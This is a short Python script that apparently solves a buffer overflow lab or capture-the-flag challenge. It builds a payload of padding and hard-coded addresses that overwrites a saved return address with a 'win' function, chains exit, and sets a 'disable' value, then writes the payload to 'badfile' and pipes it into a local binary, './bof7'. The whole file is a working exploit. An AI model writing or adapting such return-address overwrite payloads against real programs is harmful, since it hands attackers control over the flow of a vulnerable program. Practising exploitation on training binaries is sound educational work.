import struct 
import os

disable = 0x804850b
win = 0x8048539

str_fp = 263
dst_eip= 238
exit = 0xb7e327f0

atk_vector = "A"*dst_eip
atk_vector += struct.pack("I", win)
atk_vector += struct.pack("I", exit)
atk_vector += "A"*(str_fp-len(atk_vector))
atk_vector += struct.pack("I", disable)

f = open("badfile", 'w+')
f.write("%s" %atk_vector)
f.close()

os.system('cat {} | ./bof7'.format('badfile'))


